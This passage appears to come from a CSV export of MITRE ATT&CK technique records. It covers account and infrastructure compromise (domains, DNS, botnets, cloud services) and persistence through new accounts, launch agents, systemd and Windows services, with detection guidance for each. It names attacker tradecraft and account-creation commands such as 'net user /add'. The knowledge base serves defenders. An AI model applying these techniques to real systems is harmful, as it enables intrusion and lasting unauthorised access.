Adversaries can use a compromised email account to hijack existing email threads with targets of interest.",https://attack.mitre.org/techniques/T1586/002,01 October 2020,11 April 2023,enterprise-attack,1.1,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",PRE,,True,T1586,,"Bryan Onel; Tristan Bennett, Seamless Intelligence",,,,,,"(Citation: IBM ITG18 2020),(Citation: SecureWorks August 2019),(Citation: VirusBulletin Kimsuky October 2019),(Citation: NCC Group LAPSUS Apr 2022),(Citation: ANSSI Nobelium Phishing December 2021),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Checkpoint IndigoZebra July 2021),"
T1586.001,attack-pattern--274770e0-2612-4ccf-a678-ef8e7bad365d,Compromise Accounts: Social Media Accounts,"Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. 

A variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.

Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.

Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",https://attack.mitre.org/techniques/T1586/001,01 October 2020,16 October 2021,enterprise-attack,1.1,Resource Development,"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",PRE,"Network Traffic: Network Traffic Content, Persona: Social Media",True,T1586,,,,,,,,"(Citation: CISA AA21-200A APT40 July 2021),"
T1584.005,attack-pattern--810d8072-afb6-4a56-9ee7-86379ac4a6f3,Compromise Infrastructure: Botnet,"Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).",https://attack.mitre.org/techniques/T1584/005,01 October 2020,19 April 2022,enterprise-attack,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during [Phishing](https://attack.mitre.org/techniques/T1566), [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499), or [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",PRE,,True,T1584,,,,,,,,"(Citation: NCSC Cyclops Blink February 2022),(Citation: Microsoft Volt Typhoon May 2023),(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023),(Citation: Novetta-Axiom),"
T1584.002,attack-pattern--c2f59d25-87fe-44aa-8f83-e8e59d077bf5,Compromise Infrastructure: DNS Server,"Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.

By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)",https://attack.mitre.org/techniques/T1584/002,01 October 2020,19 April 2022,enterprise-attack,1.2,Resource Development,"Consider monitoring for anomalous resolution changes for domain addresses. Efforts may need to be tailored to specific domains of interest as benign resolution changes are a common occurrence on the internet.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Domain Name: Active DNS, Domain Name: Passive DNS",True,T1584,,Jeremy Galloway,,,,,,"(Citation: NCC Group LAPSUS Apr 2022),"
T1584.001,attack-pattern--f9cc4d06-775f-4ee1-b401-4e2cc0da30ba,Compromise Infrastructure: Domains,"Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.(Citation: Krebs DNS Hijack 2019)

Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)

Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)",https://attack.mitre.org/techniques/T1584/001,01 October 2020,07 March 2023,enterprise-attack,1.3,Resource Development,"Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS",True,T1584,,Jeremy Galloway,,,,,,"(Citation: McAfee Lazarus Nov 2020),(Citation: Microsoft Unidentified Dec 2018),(Citation: Google Iran Threats October 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Mandiant APT1),(Citation: Certfa Charming Kitten January 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: KISA Operation Muzabi),(Citation: Proofpoint TA453 July2021),(Citation: McAfee Lazarus Jul 2020),(Citation: ClearSky Kittens Back 3 August 2020),"
T1584.004,attack-pattern--e196b5c5-8118-4a1c-ab8a-936586ce3db5,Compromise Infrastructure: Server,"Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.

Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.",https://attack.mitre.org/techniques/T1584/004,01 October 2020,13 April 2023,enterprise-attack,1.2,Resource Development,"Once adversaries have provisioned software on a compromised server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Internet Scan: Response Content, Internet Scan: Response Metadata",True,T1584,,"Dor Edry, Microsoft",,,,,,"(Citation: Talos TinyTurla September 2021),(Citation: FireEye EPS Awakens Part 2),(Citation: Accenture HyperStack October 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET Lazarus Jun 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: Recorded Future Turla Infra 2020),(Citation: McAfee Night Dragon),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: McAfee Lazarus Jul 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Crowdstrike Indrik November 2018),"
T1584.007,attack-pattern--df1bc34d-1634-4c93-b89e-8120994fce77,Compromise Infrastructure: Serverless,"Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. 

Once compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",https://attack.mitre.org/techniques/T1584/007,08 July 2022,20 October 2022,enterprise-attack,1.0,Resource Development,,PRE,Internet Scan: Response Content,True,T1584,,Awake Security,,,,,,","
T1584.003,attack-pattern--39cc9f64-cf74-4a48-a4d8-fe98c54a02e0,Compromise Infrastructure: Virtual Private Server,"Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)

Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",https://attack.mitre.org/techniques/T1584/003,01 October 2020,17 October 2021,enterprise-attack,1.1,Resource Development,"Once adversaries have provisioned software on a compromised VPS (ex: for use as a command and control server), internet scans may reveal VPSs that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Internet Scan: Response Content, Internet Scan: Response Metadata",True,T1584,,,,,,,,"(Citation: NSA NCSC Turla OilRig),"
T1584.006,attack-pattern--ae797531-3219-49a4-bccf-324ad7a4c7b2,Compromise Infrastructure: Web Services,"Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.",https://attack.mitre.org/techniques/T1584/006,01 October 2020,12 April 2023,enterprise-attack,1.2,Resource Development,"Once adversaries leverage the abused web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.(Citation: ThreatConnect Infrastructure Dec 2020)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).",PRE,Internet Scan: Response Content,True,T1584,,"Dor Edry, Microsoft",,,,,,"(Citation: Recorded Future Turla Infra 2020),(Citation: TrendMicro EarthLusca 2022),"
T1136.003,attack-pattern--a009cb25-4801-4116-9105-80a91cf15c1b,Create Account: Cloud Account,"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)

Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.

Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",https://attack.mitre.org/techniques/T1136/003,29 January 2020,16 October 2023,enterprise-attack,1.4,Persistence,Collect usage logs from cloud user and administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.,"Azure AD, Google Workspace, IaaS, Office 365, SaaS",User Account: User Account Creation,True,T1136,,Microsoft Threat Intelligence Center (MSTIC); Praetorian,,,,,,"(Citation: AADInternals Documentation),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: MSTIC Nobelium Oct 2021),"
T1136.002,attack-pattern--7610cada-1499-41a4-b3dd-46467b68d177,Create Account: Domain Account,"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.

Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",https://attack.mitre.org/techniques/T1136/002,28 January 2020,16 October 2023,enterprise-attack,1.1,Persistence,"Monitor for processes and command-line parameters associated with domain account creation, such as <code>net user /add /domain</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary.","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation, User Account: User Account Creation",True,T1136,,,,,,,,"(Citation: Savill 1999),(Citation: NCC Group Fivehands June 2021),(Citation: Dragos Crashoverride 2018),(Citation: Mandiant FIN12 Oct 2021),(Citation: Booz Allen Hamilton),(Citation: Microsoft GALLIUM December 2019),(Citation: GitHub Pupy),(Citation: Volexity Exchange Marauder March 2021),(Citation: Github PowerShell Empire),(Citation: Cybereason Soft Cell June 2019),"
T1136.001,attack-pattern--635cbe30-392d-4e27-978e-66774357c762,Create Account: Local Account,"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. 

For example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)

Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",https://attack.mitre.org/techniques/T1136/001,28 January 2020,16 October 2023,enterprise-attack,1.3,Persistence,"Monitor for processes and command-line parameters associated with local account creation, such as <code>net user /add</code> , <code>useradd</code> , and <code>dscl -create</code> . Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary. For network infrastructure devices, collect AAA logging to monitor for account creations.","Containers, Linux, Network, Windows, macOS","Command: Command Execution, Process: Process Creation, User Account: User Account Creation",True,T1136,,"Austin Clark, @c2defense",,,,,,"(Citation: Savill 1999),(Citation: Kaspersky Flame),(Citation: FireEye CARBANAK June 2017),(Citation: FireEye APT41 Aug 2019),(Citation: aptsim),(Citation: Kaspersky Flame Functionality),(Citation: Intezer HiddenWasp Map 2019),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Mandiant FIN12 Oct 2021),(Citation: Symantec Leafminer July 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Talos ZxShell Oct 2014),(Citation: Proofpoint TA505 Jan 2019),(Citation: Symantec Calisto July 2018),(Citation: Unit 42 Hildegard Malware),(Citation: KISA Operation Muzabi),(Citation: US-CERT TA18-074A),(Citation: Cylance Dust Storm),(Citation: Github PowerShell Empire),(Citation: FireEye SMOKEDHAM June 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: BitDefender Chafer May 2020),(Citation: GitHub Pupy),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Trustwave GoldenSpy June 2020),(Citation: Intezer TeamTNT September 2020),"
T1543.001,attack-pattern--d10cbd34-42e3-45c0-84d2-535a09849584,Create or Modify System Process: Launch Agent,"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.

 Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.
 
Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X) ",https://attack.mitre.org/techniques/T1543/001,17 January 2020,21 April 2022,enterprise-attack,1.4,"Persistence, Privilege Escalation","Monitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.

Ensure Launch Agent's <code> ProgramArguments </code> key pointing to executables located in the <code>/tmp</code> or <code>/shared</code> folders are in alignment with enterprise policy. Ensure all Launch Agents with the <code>RunAtLoad</code> key set to <code>true</code> are in alignment with policy. ",macOS,"Command: Command Execution, File: File Creation, File: File Modification, Service: Service Creation, Service: Service Modification",True,T1543,,"Antonio Piazza, @antman1p","Administrator, User",,,,,"(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: ESET DazzleSpy Jan 2022),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: Objective-See MacMa Nov 2021),(Citation: wardle evilquest parti),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Securelist Calisto July 2018),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Sofacy Komplex Trojan),(Citation: synack 2016 review),(Citation: TrendMicro MacOS April 2018),(Citation: MacKeeper Bundlore Apr 2019),(Citation: objsee mac malware 2017),(Citation: CoinTicker 2019),(Citation: CheckPoint Dok),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: piazza launch agent mitigation)"
T1543.004,attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba,Create or Modify System Process: Launch Daemon,"Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)

Adversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)

Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)",https://attack.mitre.org/techniques/T1543/004,17 January 2020,30 March 2023,enterprise-attack,1.2,"Persistence, Privilege Escalation","Monitor for new files added to the <code>/Library/LaunchDaemons/</code> folder. The System LaunchDaemons are protected by SIP.

Some legitimate LaunchDaemons point to unsigned code that could be exploited. For Launch Daemons with the <code>RunAtLoad</code> parameter set to true, ensure the <code>Program</code> parameter points to signed code or executables are in alignment with enterprise policy. Some parameters are interchangeable with others, such as <code>Program</code> and <code>ProgramArguments</code> parameters but one must be present.(Citation: launchd Keywords for plists)

",macOS,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Service: Service Creation, Service: Service Modification",True,T1543,,,Administrator,,,,"Administrator, root","(Citation: sentinelone apt32 macOS backdoor 2020),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: trendmicro xcsset xcode project 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: TrendMicro MacOS April 2018),(Citation: MacKeeper Bundlore Apr 2019),(Citation: TrendMicro macOS Dacls May 2020),(Citation: ESET LoudMiner June 2019),(Citation: wardle evilquest parti),(Citation: ObjectiveSee AppleJeus 2019),"
T1543.002,attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b,Create or Modify System Process: Systemd Service,"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  

Systemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).(Citation: lambert systemd 2022) 

Inside the `.service` unit files, the following directives are used to execute commands:(Citation: freedesktop systemd.service)  

* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.
* `ExecReload` directive executes when a service restarts. 
* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  

Adversaries have created new service files, altered the commands a `.service` file’s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016) ",https://attack.mitre.org/techniques/T1543/002,17 January 2020,09 October 2023,enterprise-attack,1.4,"Persistence, Privilege Escalation","Monitor file creation and modification events of Systemd service unit configuration files in the default directory locations for `root` & `user` level permissions. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the `root` user.(Citation: lambert systemd 2022) 

Suspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: `systemctl list-units -–type=service –all`. Analyze the contents of `.service` files present on the file system and ensure that they refer to legitimate, expected executables, and symbolic links.(Citation: Berba hunting linux systemd)

Auditing the execution and command-line arguments of the `systemctl` utility, as well related utilities such as `/usr/sbin/service` may reveal malicious systemd service execution.",Linux,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Service: Service Creation, Service: Service Modification",True,T1543,,"Emad Al-Mousa, Saudi Aramco; Tim (Wadhwa-)Brown; Tony Lambert, Red Canary","root, User",,,,,"(Citation: Trend Micro TeamTNT),(Citation: ESET TeleBots Oct 2018),(Citation: Lunghi Iron Tiger Linux),(Citation: Fysbis Dr Web Analysis),(Citation: RotaJakiro 2021 netlab360 analysis),(Citation: Cisco Talos Intelligence Group),(Citation: Unit 42 Hildegard Malware),(Citation: GitHub Pupy),(Citation: ANSSI Sandworm January 2021),(Citation: Anomali Rocke March 2019),"
T1543.003,attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32,Create or Modify System Process: Windows Service,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.

Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. 

Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as ""Bring Your Own Vulnerable Driver"" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)

Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component).",https://attack.mitre.org/techniques/T1543/003,17 January 2020,15 September 2023,enterprise-attack,1.4,"Persistence, Privilege Escalation","Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  

Look for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  

Creation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.

